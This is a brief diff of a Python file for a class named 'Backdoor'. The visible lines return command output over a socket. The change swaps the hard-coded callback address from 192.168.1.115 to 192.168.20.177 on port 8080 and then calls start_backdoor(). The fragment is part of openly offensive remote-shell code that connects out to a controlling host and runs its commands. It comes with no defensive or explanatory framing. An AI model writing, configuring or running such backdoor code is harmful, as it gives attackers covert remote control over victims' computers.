@@ -64,5 +64,5 @@ class Backdoor:
 			self.json_send(command_output)
 		self.my_connection.close()
 
-my_socket_object = Backdoor("192.168.1.115",8080)
+my_socket_object = Backdoor("192.168.20.177",8080)
 my_socket_object.start_backdoor()
